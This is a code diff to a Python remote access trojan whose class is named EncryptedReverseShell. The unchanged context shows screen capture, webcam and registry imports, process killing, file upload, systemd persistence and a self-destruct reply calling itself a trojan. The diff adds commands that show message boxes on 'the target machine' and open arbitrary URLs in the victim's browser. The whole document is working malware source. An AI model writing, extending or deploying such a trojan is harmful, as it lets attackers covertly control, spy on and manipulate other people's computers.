@@ -1,4 +1,5 @@
 import ctypes
+import webbrowser
 import winreg as wrg
 import socket
 import subprocess
@@ -20,6 +21,8 @@ from datetime import datetime
 import psutil
 from PIL import ImageGrab
 import cv2
+import tkinter as tk
+from tkinter import messagebox
 
 HOST = '127.0.0.1'
 
@@ -232,6 +235,61 @@ class EncryptedReverseShell:
             info["psutil_error"] = str(e)
         
         return info
+    
+    def show_messagebox(self, title="Message", message="", msg_type="info"):
+        """Show a message box on the target machine"""
+        try:
+            if not message:
+                return {"error": "No message provided"}
+            
+            # Create a hidden root window
+            root = tk.Tk()
+            root.withdraw()  # Hide the main window
+            
+            # Make the message box appear on top
+            root.attributes('-topmost', True)
+            
+            # Show different types of message boxes
+            if msg_type.lower() == "error":
+                messagebox.showerror(title, message)
+            elif msg_type.lower() == "warning":
+                messagebox.showwarning(title, message)
+            elif msg_type.lower() == "yesno":
+                result = messagebox.askyesno(title, message)
+                root.destroy()
+                return {
+                    "success": True,
+                    "message": f"Message box displayed",
+                    "title": title,
+                    "content": message,
+                    "type": msg_type,
+                    "response": "Yes" if result else "No"
+                }
+            elif msg_type.lower() == "okcancel":
+                result = messagebox.askokcancel(title, message)
+                root.destroy()
+                return {
+                    "success": True,
+                    "message": f"Message box displayed",
+                    "title": title,
+                    "content": message,
+                    "type": msg_type,
+                    "response": "OK" if result else "Cancel"
+                }
+            else:  # info
+                messagebox.showinfo(title, message)
+            
+            root.destroy()
+            
+            return {
+                "success": True,
+                "message": f"Message box displayed with title: '{title}'",
+                "title": title,
+                "content": message,
+                "type": msg_type
+            }
+        except Exception as e:
+            return {"error": f"Error showing message box: {str(e)}"}
 
     def get_battery_info(self):
         try:
@@ -532,6 +590,25 @@ class EncryptedReverseShell:
                 
         except Exception as e:
             return {"error": f"Process suspension failed: {str(e)}"}
+        
+    def open_page(self, url):
+        """Open a URL in the default web browser"""
+        try:
+            if not url:
+                return {"error": "No URL provided"}
+            
+            # Validate URL format
+            if not url.startswith(('http://', 'https://')):
+                url = 'https://' + url
+            
+            webbrowser.open_new_tab(url)
+            return {
+                "success": True,
+                "message": f"Opened {url} in browser",
+                "url": url
+            }
+        except Exception as e:
+            return {"error": f"Error opening URL: {str(e)}"}
 
     def kill_process(self, process_identifier):
         """Kill a process by name or PID"""
@@ -1206,6 +1283,18 @@ WantedBy=default.target
                 destruction_thread.start()
                 
                 return {"killed": "OK! Trojan destroyed and connection terminated."}
+            
+            elif cmd_type == "open_page":
+                if command:
+                    return {"open_page_result": self.open_page(command)}
+                else:
+                    return {"error": "Please specify a URL to open"}
+                
+            elif cmd_type == "messagebox":
+                msg_title = command_data.get("title", "Message")
+                msg_text = command_data.get("message", command)
+                msg_type = command_data.get("msg_type", "info")
+                return {"messagebox_result": self.show_messagebox(msg_title, msg_text, msg_type)}
             
             elif cmd_type == "upload":
                 if upload_data and file_name:
